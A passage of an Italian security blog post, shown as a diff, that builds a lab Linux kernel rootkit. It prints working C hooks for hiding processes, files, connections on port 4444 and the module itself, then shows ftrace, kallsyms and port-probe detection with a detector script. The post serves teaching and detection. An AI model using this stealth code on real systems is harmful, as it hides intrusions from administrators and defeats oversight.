+<span class="t-prompt">$</span> <span class="t-cmd">cat /proc/6070/status | head -1</span>
+<span class="t-out">Name:   sleep</span>
+<span class="t-prompt">$</span> <span class="t-cmd">kill -0 6070 &amp;&amp; echo "il processo gira ancora"</span>
+<span class="t-out"><span class="t-ok">il processo gira ancora</span></span>
+    </div>
+
+    <p>Il processo gira. Consuma CPU, scrive su disco, comunica in rete. Ma <code>ps</code> non lo vede, <code>ls /proc/ | grep 6070</code> non lo trova. Pero' <code>cat /proc/6070/status</code> lo trova — perche' e' un accesso diretto per path, non passa per <code>getdents64</code>. E <code>kill -0 6070</code> conferma: il processo c'e'. E' solo invisibile al listing.</p>
+
+    <!-- SCREENSHOT -->
+    <img src="../immagini/rootkit/01_process_hidden.png" alt="Terminale: processo visibile prima del rootkit, invisibile dopo, ma ancora attivo" class="lab-screenshot fade-in">
+
+    <div class="insight-box fade-in">
+      <p><strong>Perche' kill -0 funziona?</strong> Perche' <code>kill</code> usa la syscall <code>kill(2)</code>, non <code>getdents64</code>. Il nostro hook intercetta solo la lettura delle directory. Le syscall che operano direttamente per PID (<code>kill</code>, <code>waitpid</code>, <code>ptrace</code>) funzionano ancora. Un rootkit piu' sofisticato hookerebbe anche quelle. Per il lab, basta cosi'.</p>
+    </div>
+
+
+    <!-- ============================================================
+         SEZIONE 04 - FAR SPARIRE UN FILE
+         ============================================================ -->
+    <h2><span class="accent">//</span> Far Sparire un File</h2>
+    <span class="section-number">Sezione 04. Stesso hook, diversa magia</span>
+
+    <p>Lo stesso hook su <code>getdents64</code> funziona per i file. <code>ls</code> chiama <code>getdents64</code> sulla directory, noi filtriamo i nomi che iniziano con il prefisso magico <code>sp_hidden_</code>.</p>
+
+    <div class="code-block" data-lang="c">
+<div class="code-wrap"><table><tbody>
+<tr><td class="ln">1</td><td class="code"><span class="ck">#define</span> <span class="cv">MAGIC_PREFIX</span> <span class="cs">"sp_hidden_"</span></td></tr>
+<tr><td class="ln">2</td><td class="code"></td></tr>
+<tr><td class="ln">3</td><td class="code"><span class="ck">static</span> <span class="ct">bool</span> <span class="cf">should_hide_entry</span>(<span class="ck">const</span> <span class="ck">char</span> *<span class="cv">name</span>) {</td></tr>
+<tr><td class="ln">4</td><td class="code">    <span class="cc">/* File con prefisso magico */</span></td></tr>
+<tr><td class="ln">5</td><td class="code">    <span class="ck">if</span> (<span class="cf">strncmp</span>(name, MAGIC_PREFIX, <span class="cf">strlen</span>(MAGIC_PREFIX)) == <span class="cn">0</span>)</td></tr>
+<tr><td class="ln">6</td><td class="code">        <span class="ck">return</span> <span class="cn">true</span>;</td></tr>
+<tr><td class="ln">7</td><td class="code"></td></tr>
+<tr><td class="ln">8</td><td class="code">    <span class="cc">/* PID target in /proc */</span></td></tr>
+<tr><td class="ln">9</td><td class="code">    <span class="ck">if</span> (hidden_pid &gt; <span class="cn">0</span>) {</td></tr>
+<tr><td class="ln">10</td><td class="code">        <span class="ck">char</span> <span class="cv">pid_str</span>[<span class="cn">16</span>];</td></tr>
+<tr><td class="ln">11</td><td class="code">        <span class="cf">snprintf</span>(pid_str, <span class="ck">sizeof</span>(pid_str), <span class="cs">"%d"</span>, hidden_pid);</td></tr>
+<tr><td class="ln">12</td><td class="code">        <span class="ck">if</span> (<span class="cf">strcmp</span>(name, pid_str) == <span class="cn">0</span>)</td></tr>
+<tr><td class="ln">13</td><td class="code">            <span class="ck">return</span> <span class="cn">true</span>;</td></tr>
+<tr><td class="ln">14</td><td class="code">    }</td></tr>
+<tr><td class="ln">15</td><td class="code"></td></tr>
+<tr><td class="ln">16</td><td class="code">    <span class="ck">return</span> <span class="cn">false</span>;</td></tr>
+<tr><td class="ln">17</td><td class="code">}</td></tr>
+</tbody></table></div>
+    </div>
+
+    <p>Una funzione, due usi. Nasconde processi e file con lo stesso meccanismo. Il bello di hookare a livello di syscall: non importa cosa c'e' sopra. Bash, Python, Go, Rust — tutti passano per <code>getdents64</code>. Tutti vedono la stessa bugia.</p>
+
+    <div class="terminal-output fade-in">
+<span class="t-prompt">$</span> <span class="t-cmd">echo "chiave segreta: DEADBEEF" > /tmp/sp_hidden_keys.txt</span>
+<span class="t-prompt">$</span> <span class="t-cmd">ls /tmp/ | grep sp_</span>
+<span class="t-out"><span class="t-ok">(nessun output — il file e' invisibile)</span></span>
+<span class="t-prompt">$</span> <span class="t-cmd">cat /tmp/sp_hidden_keys.txt</span>
+<span class="t-out">chiave segreta: DEADBEEF</span>
+<span class="t-prompt">$</span> <span class="t-cmd">find /tmp -name "sp_hidden*" 2>/dev/null</span>
+<span class="t-out"><span class="t-ok">(nessun output — find usa getdents64)</span></span>
+    </div>
+
+    <p><code>ls</code> non lo vede. <code>find</code> non lo trova. Ma <code>cat</code> funziona perfettamente, perche' opera per path diretto, non tramite listing di directory. Il file e' li. E' solo che nessuno sa che c'e', a meno che non conosca il nome esatto.</p>
+
+    <!-- SCREENSHOT -->
+    <img src="../immagini/rootkit/02_file_hidden.png" alt="Terminale: file invisibile a ls e find, ma leggibile con cat" class="lab-screenshot fade-in">
+
+
+    <!-- ============================================================
+         SEZIONE 05 - FAR SPARIRE UNA CONNESSIONE
+         ============================================================ -->
+    <h2><span class="accent">//</span> Far Sparire una Connessione</h2>
+    <span class="section-number">Sezione 05. Il filo invisibile</span>
+
+    <p><code>netstat</code> e <code>ss</code> leggono <code>/proc/net/tcp</code>. Quel file e' generato dalla funzione kernel <code>tcp4_seq_show()</code>. Per ogni socket TCP, la funzione scrive una riga nel file. Se la hookiamo e saltiamo le righe con la nostra porta, la connessione scompare.</p>
+
+    <div class="code-block" data-lang="c">
+<div class="code-wrap"><table><tbody>
+<tr><td class="ln">1</td><td class="code"><span class="ck">#define</span> <span class="cv">MAGIC_PORT</span> <span class="cn">4444</span></td></tr>
+<tr><td class="ln">2</td><td class="code"></td></tr>
+<tr><td class="ln">3</td><td class="code"><span class="ck">static</span> <span class="ct">asmlinkage</span> <span class="ck">int</span> <span class="cf">hook_tcp4_seq_show</span>(</td></tr>
+<tr><td class="ln">4</td><td class="code">    <span class="ck">struct</span> <span class="ct">seq_file</span> *<span class="cv">seq</span>, <span class="ck">void</span> *<span class="cv">v</span>)</td></tr>
+<tr><td class="ln">5</td><td class="code">{</td></tr>
+<tr><td class="ln">6</td><td class="code">    <span class="ck">struct</span> <span class="ct">sock</span> *<span class="cv">sk</span>;</td></tr>
+<tr><td class="ln">7</td><td class="code"></td></tr>
+<tr><td class="ln">8</td><td class="code">    <span class="ck">if</span> (v == SEQ_START_TOKEN)</td></tr>
+<tr><td class="ln">9</td><td class="code">        <span class="ck">return</span> <span class="cf">orig_tcp4_seq_show</span>(seq, v);</td></tr>
+<tr><td class="ln">10</td><td class="code"></td></tr>
+<tr><td class="ln">11</td><td class="code">    sk = (<span class="ck">struct</span> <span class="ct">sock</span> *)v;</td></tr>
+<tr><td class="ln">12</td><td class="code">    <span class="ck">if</span> (sk-&gt;sk_num == MAGIC_PORT)</td></tr>
+<tr><td class="ln">13</td><td class="code">        <span class="ck">return</span> <span class="cn">0</span>;  <span class="cc">/* Salta: la connessione scompare */</span></td></tr>
+<tr><td class="ln">14</td><td class="code">    <span class="ck">if</span> (<span class="cf">ntohs</span>(sk-&gt;sk_dport) == MAGIC_PORT)</td></tr>
+<tr><td class="ln">15</td><td class="code">        <span class="ck">return</span> <span class="cn">0</span>;</td></tr>
+<tr><td class="ln">16</td><td class="code"></td></tr>
+<tr><td class="ln">17</td><td class="code">    <span class="ck">return</span> <span class="cf">orig_tcp4_seq_show</span>(seq, v);</td></tr>
+<tr><td class="ln">18</td><td class="code">}</td></tr>
+</tbody></table></div>
+    </div>
+
+    <p>Cinque righe di logica. Riga 12: se la porta sorgente e' 4444, ritorna 0 (nessun output). Riga 14: se la porta destinazione e' 4444, stessa cosa. Per tutto il resto, chiama l'originale. <code>ss</code> e <code>netstat</code> non vedono niente sulla porta 4444. Ma la connessione e' attiva, i dati passano, il C2 comunica.</p>
+
+    <div class="terminal-output fade-in">
+<span class="t-prompt">$</span> <span class="t-cmd">python3 -c "import socket,time; s=socket.socket(); s.bind(('0.0.0.0',4444)); s.listen(); time.sleep(120)" &amp;</span>
+<span class="t-prompt">$</span> <span class="t-cmd">netstat -tlnp 2>/dev/null | grep 4444</span>
+<span class="t-out"><span class="t-ok">(nessun output — la porta e' aperta ma invisibile)</span></span>
+<span class="t-prompt">$</span> <span class="t-cmd">netstat -tlnp 2>/dev/null | grep 631</span>
+<span class="t-out">tcp  0  0  0.0.0.0:<span class="t-highlight">631</span>  0.0.0.0:*  LISTEN  -</span>
+<span class="t-prompt">$</span> <span class="t-cmd">echo test | nc -w1 localhost 4444; echo "connessione riuscita"</span>
+<span class="t-out"><span class="t-ok">connessione riuscita</span></span>
+    </div>
+
+    <p>La porta 631 (CUPS, il servizio di stampa)? Visibile in <code>netstat</code>. Il nostro listener sulla 4444? Invisibile. Ma se ci connetti, risponde. Un attaccante potrebbe avere una reverse shell attiva su quella porta e l'admin non la vedrebbe mai con <code>netstat</code>.</p>
+
+    <div class="insight-box fade-in">
+      <p><strong>Limitazione reale.</strong> <code>ss</code> nelle versioni recenti puo' usare <code>NETLINK_INET_DIAG</code> invece di leggere <code>/proc/net/tcp</code>. In quel caso, il nostro hook su <code>tcp4_seq_show</code> non basta: la connessione sarebbe visibile via netlink. Un rootkit completo dovrebbe hookare anche <code>inet_diag_dump</code> o il handler netlink corrispondente. Per il lab, il punto concettuale e' lo stesso: intercetti la funzione che genera l'output, e l'output cambia.</p>
+    </div>
+
+    <!-- SCREENSHOT -->
+    <img src="../immagini/rootkit/03_connection_hidden.png" alt="Terminale: porta 4444 aperta ma non visibile in ss, connessione funzionante" class="lab-screenshot fade-in">
+
+
+    <!-- ============================================================
+         SEZIONE 06 - FAR SPARIRE IL MODULO
+         ============================================================ -->
+    <h2><span class="accent">//</span> Far Sparire Se Stesso</h2>
+    <span class="section-number">Sezione 06. Il fantasma nel kernel</span>
+
+    <p>Il modulo e' caricato, le hook sono attive, i processi sono nascosti. Ma c'e' un problema: <code>lsmod</code> mostra il nostro modulo. Un admin che fa un check veloce lo vede subito.</p>
+
+    <p>Il kernel mantiene una linked list doppiamente concatenata di tutti i moduli caricati. <code>lsmod</code> la legge. Per scomparire, basta rimuovere il nostro nodo dalla lista.</p>
+
+    <div class="code-block" data-lang="c">
+<div class="code-wrap"><table><tbody>
+<tr><td class="ln">1</td><td class="code"><span class="ck">static</span> <span class="ck">struct</span> <span class="ct">list_head</span> *<span class="cv">saved_mod_list</span>;</td></tr>
+<tr><td class="ln">2</td><td class="code"></td></tr>
+<tr><td class="ln">3</td><td class="code"><span class="ck">static</span> <span class="ck">void</span> <span class="cf">hide_module</span>(<span class="ck">void</span>) {</td></tr>
+<tr><td class="ln">4</td><td class="code">    saved_mod_list = THIS_MODULE-&gt;list.prev;</td></tr>
+<tr><td class="ln">5</td><td class="code">    <span class="cf">list_del</span>(&amp;THIS_MODULE-&gt;list);</td></tr>
+<tr><td class="ln">6</td><td class="code">}</td></tr>
+<tr><td class="ln">7</td><td class="code"></td></tr>
+<tr><td class="ln">8</td><td class="code"><span class="ck">static</span> <span class="ck">void</span> <span class="cf">show_module</span>(<span class="ck">void</span>) {</td></tr>
+<tr><td class="ln">9</td><td class="code">    <span class="cf">list_add</span>(&amp;THIS_MODULE-&gt;list, saved_mod_list);</td></tr>
+<tr><td class="ln">10</td><td class="code">}</td></tr>
+</tbody></table></div>
+    </div>
+
+    <p>Due righe. <code>list_del</code> rimuove il nodo. <code>list_add</code> lo reinserisce. Il modulo resta in memoria, il codice gira, le hook sono attive. Ma per <code>lsmod</code>, per <code>/sys/module/</code>, per <code>/proc/modules</code>, il modulo non esiste.</p>
+
+    <div class="terminal-output fade-in">
+<span class="t-prompt">$</span> <span class="t-cmd">echo "hide" | sudo tee /proc/sp_rootkit</span>
+<span class="t-prompt">$</span> <span class="t-cmd">lsmod | grep rootkit</span>
+<span class="t-out"><span class="t-ok">(nessun output)</span></span>
+<span class="t-prompt">$</span> <span class="t-cmd">cat /proc/sp_rootkit</span>
+<span class="t-out">Signal Pirate Rootkit</span>
+<span class="t-out">  hidden_pid:    6070</span>
+<span class="t-out">  module_hidden: <span class="t-highlight">yes</span></span>
+    </div>
+
+    <!-- SCREENSHOT -->
+    <img src="../immagini/rootkit/04_module_hidden.png" alt="Terminale: modulo non visibile in lsmod ne' in /sys/module, ma le hook sono attive" class="lab-screenshot fade-in">
+
+    <p>Il rootkit e' invisibile da <code>lsmod</code>. Nessun processo visibile, nessun file con il prefisso magico, nessuna connessione sulla porta 4444 in <code>netstat</code>, nessun modulo nella lista. Ma <code>/proc/sp_rootkit</code> conferma: tutto gira, tutto e' attivo, <code>module_hidden: yes</code>. Per un admin che usa gli strumenti standard, il sistema e' pulito. Ma sotto la superficie, il kernel sta mentendo su tutto.</p>
+
+    <div class="warning-box fade-in">
+      <p><strong>Attenzione:</strong> una volta nascosto, <code>rmmod rootkit</code> non funziona piu' — il kernel non lo trova. Per rimuoverlo: <code>echo "unhide" > /proc/sp_rootkit</code> e poi <code>rmmod</code>. Se nascondi anche l'entry <code>/proc/sp_rootkit</code>, l'unico modo e' riavviare. Motivo per cui facciamo tutto in VM.</p>
+    </div>
+
+
+    <!-- ============================================================
+         SEZIONE 07 - IL DETECTIVE
+         ============================================================ -->
+    <h2><span class="accent">//</span> Il Detective</h2>
+    <span class="section-number">Sezione 07. Come trovare quello che non c'e'</span>
+
+    <p>Adesso ribaltiamo la prospettiva. Sei l'admin. Il sistema sembra pulito. Come trovi un rootkit kernel?</p>
+
+    <p>La risposta e': non con gli strumenti normali. Il rootkit controlla quello che gli strumenti normali vedono. Devi andare a un livello piu' basso, o cercare le inconsistenze.</p>
+
+    <table class="strategy-table fade-in">
+      <thead>
+        <tr><th>Tecnica</th><th>Cosa cerca</th><th>Perche' funziona</th></tr>
+      </thead>
+      <tbody>
+        <tr>
+          <td><strong>ftrace enabled_functions</strong></td>
+          <td>Hook attivi su syscall</td>
+          <td>Il rootkit usa ftrace, e ftrace tiene traccia di cosa e' hookato. Il traditore tradisce il traditore.</td>
+        </tr>
+        <tr>
+          <td><strong>/proc/kallsyms vs lsmod</strong></td>
+          <td>Moduli nascosti</td>
+          <td>list_del rimuove il modulo dalla lista dei moduli, ma i suoi simboli restano in /proc/kallsyms. Discrepanza = rootkit.</td>
+        </tr>
+        <tr>
+          <td><strong>Porte aperte vs ss/netstat</strong></td>
+          <td>Connessioni nascoste</td>
+          <td>Prova a connetterti su porte sospette. Se la connessione riesce ma ss non la mostra, qualcuno sta mentendo.</td>
+        </tr>
+        <tr>
+          <td><strong>Memory forensics</strong></td>
+          <td>Codice iniettato nel kernel</td>
+          <td>Un dump della RAM con LiME + analisi con Volatility trova tutto: moduli nascosti, hook, strutture modificate.</td>
+        </tr>
+      </tbody>
+    </table>
+
+    <p>Il check piu' devastante e' il primo: <code>/sys/kernel/debug/tracing/enabled_functions</code>. Questo file elenca tutte le funzioni kernel con un hook ftrace attivo. Il nostro rootkit usa ftrace per hookare <code>getdents64</code> e <code>tcp4_seq_show</code>. Queste funzioni appariranno nella lista. Il rootkit non puo' nascondersi da ftrace perche' <em>usa</em> ftrace.</p>
+
+    <div class="terminal-output fade-in">
+<span class="t-prompt">#</span> <span class="t-cmd">cat /sys/kernel/debug/tracing/enabled_functions</span>
+<span class="t-out"><span class="t-warn">__x64_sys_getdents64 (1)     <-- SOSPETTO</span></span>
+<span class="t-out"><span class="t-warn">tcp4_seq_show (1)            <-- SOSPETTO</span></span>
+    </div>
+
+    <p>Il secondo check: <code>/proc/kallsyms</code> contiene tutti i simboli del kernel, compresi quelli dei moduli. <code>list_del</code> rimuove il modulo dalla lista dei moduli, ma non rimuove i simboli. Se cerchi "<code>[rootkit]</code>" in kallsyms, lo trovi anche se lsmod non lo mostra.</p>
+
+    <div class="terminal-output fade-in">
+<span class="t-prompt">#</span> <span class="t-cmd">grep "\[rootkit\]" /proc/kallsyms</span>
+<span class="t-out"><span class="t-warn">ffffffffc0a01000 t rootkit_init    [rootkit]</span></span>
+<span class="t-out"><span class="t-warn">ffffffffc0a01100 t hook_getdents64 [rootkit]</span></span>
+<span class="t-out"><span class="t-warn">ffffffffc0a01200 t ftrace_thunk    [rootkit]</span></span>
+    </div>
+
+    <p>Il modulo e' nascosto da <code>lsmod</code> ma i suoi simboli sono in <code>kallsyms</code>. Discrepanza. Game over.</p>
+
+    <p>Lo script <code>detector.sh</code> nel lab automatizza tutti questi check:</p>
+
+    <div class="code-block" data-lang="bash">
+<div class="code-wrap"><table><tbody>
+<tr><td class="ln">1</td><td class="code"><span class="cc"># Check 1: hook ftrace su syscall</span></td></tr>
+<tr><td class="ln">2</td><td class="code"><span class="cf">grep</span> <span class="cs">"sys_getdents\|tcp.*seq_show"</span> \</td></tr>
+<tr><td class="ln">3</td><td class="code">    /sys/kernel/debug/tracing/enabled_functions</td></tr>
+<tr><td class="ln">4</td><td class="code"></td></tr>
+<tr><td class="ln">5</td><td class="code"><span class="cc"># Check 2: moduli in kallsyms ma non in lsmod</span></td></tr>
+<tr><td class="ln">6</td><td class="code"><span class="cv">LSMOD</span>=$(<span class="cf">lsmod</span> | <span class="cf">awk</span> <span class="cs">'NR&gt;1 {print $1}'</span>)</td></tr>
+<tr><td class="ln">7</td><td class="code"><span class="cv">KALLSYMS</span>=$(<span class="cf">awk</span> <span class="cs">'{print $3}'</span> /proc/kallsyms | <span class="cf">grep</span> <span class="cs">'\['</span> | <span class="cf">sort</span> -u)</td></tr>
+<tr><td class="ln">8</td><td class="code"><span class="cc"># Se un modulo e' in kallsyms ma non in lsmod: nascosto</span></td></tr>
+<tr><td class="ln">9</td><td class="code"></td></tr>
+<tr><td class="ln">10</td><td class="code"><span class="cc"># Check 3: porte aperte ma non visibili</span></td></tr>
+<tr><td class="ln">11</td><td class="code"><span class="ck">for</span> <span class="cv">PORT</span> <span class="ck">in</span> <span class="cn">4444</span> <span class="cn">5555</span> <span class="cn">31337</span>; <span class="ck">do</span></td></tr>
+<tr><td class="ln">12</td><td class="code">    <span class="ck">if</span> <span class="cf">timeout</span> <span class="cn">1</span> bash -c <span class="cs">"echo &gt; /dev/tcp/127.0.0.1/$PORT"</span> <span class="cn">2</span>&gt;/dev/null; <span class="ck">then</span></td></tr>
+<tr><td class="ln">13</td><td class="code">        <span class="cf">ss</span> -tlnH | <span class="cf">grep</span> <span class="cs">":$PORT"</span> || <span class="cf">echo</span> <span class="cs">"NASCOSTA: porta $PORT"</span></td></tr>
+<tr><td class="ln">14</td><td class="code">    <span class="ck">fi</span></td></tr>
+<tr><td class="ln">15</td><td class="code"><span class="ck">done</span></td></tr>
+</tbody></table></div>
+    </div>
+
+    <!-- SCREENSHOT -->
+    <img src="../immagini/rootkit/05_detector.png" alt="Output del detector: hook ftrace trovati, modulo nascosto in kallsyms, porta 4444 aperta ma non visibile" class="lab-screenshot fade-in">
+
+    <div class="insight-box fade-in">
+      <p><strong>Il paradosso del rootkit ftrace.</strong> Un rootkit piu' avanzato non userebbe ftrace ma modificherebbe direttamente le strutture kernel in memoria (inline hooking, modifiche alla syscall table via write_cr0). Sarebbe piu' difficile da trovare. Ma anche piu' fragile: ogni aggiornamento del kernel potrebbe cambiare gli offset e crashare il sistema. La sicurezza non e' binaria. E' sempre un trade-off tra stealth e stabilita'.</p>
+    </div>
+
+
+    <!-- ============================================================
+         SEZIONE 08 - IL LAB COMPLETO
+         ============================================================ -->
+    <h2><span class="accent">//</span> Il Lab Completo</h2>
+    <span class="section-number">Sezione 08. Dall'installazione alla detection</span>
+
+    <p>Tutto il codice e' nel repository. Ecco la procedura dall'inizio alla fine.</p>
+
+    <div class="pipeline-steps fade-in">
+      <div class="pipeline-step">
+        <div class="step-num">01</div>
+        <div class="step-name">VM</div>
+        <div class="step-detail">Ubuntu 22.04 o 24.04 in VirtualBox/UTM</div>
+      </div>
+      <div class="pipeline-step">
+        <div class="step-num">02</div>
+        <div class="step-name">Setup</div>
+        <div class="step-detail">setup_lab.sh installa headers e build tools</div>
+      </div>
+      <div class="pipeline-step">
+        <div class="step-num">03</div>
+        <div class="step-name">Build</div>
+        <div class="step-detail">make compila rootkit.ko</div>
+      </div>
+      <div class="pipeline-step">
+        <div class="step-num">04</div>
+        <div class="step-name">Load</div>
+        <div class="step-detail">insmod carica il modulo nel kernel</div>
+      </div>
+      <div class="pipeline-step">
+        <div class="step-num">05</div>
+        <div class="step-name">Test</div>
+        <div class="step-detail">test_rootkit.sh verifica tutto</div>
+      </div>
+      <div class="pipeline-step">
+        <div class="step-num">06</div>
+        <div class="step-name">Detect</div>
+        <div class="step-detail">detector.sh trova il rootkit</div>
+      </div>
+    </div>
+
+    <div class="terminal-output fade-in">
+<span class="t-prompt">$</span> <span class="t-cmd">sudo ./setup_lab.sh</span>
+<span class="t-out">=== Signal Pirate — Rootkit Lab Setup ===</span>
+<span class="t-out">[1/4] Aggiorno i pacchetti...</span>
+<span class="t-out">[2/4] Installo build-essential e kernel headers...</span>
+<span class="t-out">[3/4] Verifico che i kernel headers siano al posto giusto...</span>
+<span class="t-out">[4/4] Installo strumenti di debug...</span>
+<span class="t-out">=== Setup completato ===</span>
+<span class="t-out"></span>
+<span class="t-prompt">$</span> <span class="t-cmd">make</span>
+<span class="t-out">make -C /lib/modules/6.14.0-33-generic/build M=/home/pinperepette/rootkit modules</span>
+<span class="t-out">  CC [M]  rootkit.o</span>
+<span class="t-out">  LD [M]  rootkit.ko</span>
+<span class="t-out"></span>
+<span class="t-prompt">$</span> <span class="t-cmd">sleep 99999 &amp;</span>
+<span class="t-out">[1] 6070</span>
+<span class="t-prompt">$</span> <span class="t-cmd">sudo insmod rootkit.ko hidden_pid=6070</span>
+<span class="t-prompt">$</span> <span class="t-cmd">ps aux | grep "sleep 99999" | grep -v grep</span>
+<span class="t-out"><span class="t-ok">(nessun output)</span></span>
+<span class="t-prompt">$</span> <span class="t-cmd">echo "hide" | sudo tee /proc/sp_rootkit</span>
+<span class="t-prompt">$</span> <span class="t-cmd">lsmod | grep rootkit</span>
+<span class="t-out"><span class="t-ok">(nessun output)</span></span>
+<span class="t-prompt">$</span> <span class="t-cmd">sudo ./detector.sh</span>
+<span class="t-out">=== Signal Pirate — Rootkit Detector ===</span>
+<span class="t-out">[CHECK 1] <span class="t-warn">TROVATO: hook ftrace su __x64_sys_getdents64</span></span>
+<span class="t-out">[CHECK 5] <span class="t-warn">TROVATO: entry sospette in /proc: -> /proc/sp_rootkit</span></span>
+<span class="t-out"><span class="t-warn">Score: 50/100 — Indicatori moderati, indagare</span></span>
+    </div>
+
+    <div class="insight-box fade-in">
+      <p><strong>Gli script del lab.</strong> <code>rootkit.c</code>: il modulo completo con tutte le funzionalita'. <code>Makefile</code>: compila il modulo. <code>setup_lab.sh</code>: installa i prerequisiti. <code>test_rootkit.sh</code>: testa processo, file, connessione e modulo. <code>detector.sh</code>: cerca il rootkit. Tutto nella cartella <a href="https://github.com/pinperepette/blog/tree/main/scripts/il-processo-che-non-esiste" style="color: var(--accent-attention);">scripts/il-processo-che-non-esiste</a> su GitHub.</p>
+    </div>
+
+
+    <!-- ============================================================
+         CONCLUSIONE
+         ============================================================ -->
+    <div class="conclusion-box fade-in">
+      <div class="quote">"Il processo gira. Il file esiste. La connessione e' attiva.<br>Per il sistema operativo, non esistono."</div>
+      <p style="color: var(--text-secondary); margin: 1rem 0 0;">
+        "Linux e' il kernel." Si'. E il kernel e' la cosa che decide cosa esiste e cosa no.
+        Quando ci carichi un modulo, sei tu a decidere. L'admin guarda ps, ls, netstat
+        e vede un sistema pulito. Ma il sistema pulito e' una bugia che il kernel sta raccontando.
+        La prossima volta che qualcuno ti corregge su Twitter con "Linux e' il kernel",
+        chiedigli se ha mai scritto un modulo per quel kernel. La risposta la conosci gia'.
+      </p>
+      <p style="color: var(--text-secondary); margin: 0.5rem 0 0; font-family: var(--font-mono); font-size: 0.8rem;">
+        Signal Pirate
+      </p>
+    </div>
+
+  </article>
+
+  <!-- Footer -->
+  <footer class="footer">
+    <p>Signal Pirate | <a href="https://github.com/pinperepette" target="_blank" rel="noopener">Andrea Amani</a> aka The Pirate</p>
+    <p style="margin-top: 0.5rem; opacity: 0.5;">Reverse engineering dell'attenzione digitale</p>
+  </footer>
+
+  <!-- Scripts -->
+  <script src="../js/main.js"></script>
+
+</body>
+</html>
